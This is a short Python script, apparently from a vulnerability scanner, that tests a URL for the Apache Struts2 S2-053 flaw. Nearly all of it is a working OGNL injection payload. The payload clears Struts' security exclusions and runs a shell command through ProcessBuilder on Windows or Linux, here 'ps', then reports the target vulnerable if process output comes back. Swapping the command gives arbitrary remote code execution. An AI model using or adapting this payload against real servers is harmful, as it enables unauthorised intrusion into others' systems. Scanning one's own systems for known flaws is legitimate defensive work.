# -*- encoding: utf-8 -*-
'''
@File : s2_053.py
@Time : 2019/08/03 22:08:25
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from lib import *
import sys
from urllib.parse import quote

def s2_053(url):
    try:
        cmd = r'ps'
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name')."
        payload += "toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
        payload += "(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream(),'UTF-8'))}"
        payload = quote(payload)
        resp = requests.get(r'{}/?name={}'.format(url,payload))
        if "PID"  in resp.text:
            print(Vcolors.RED +"存在S2-053漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-053漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-053漏洞~"+ Vcolors.ENDC)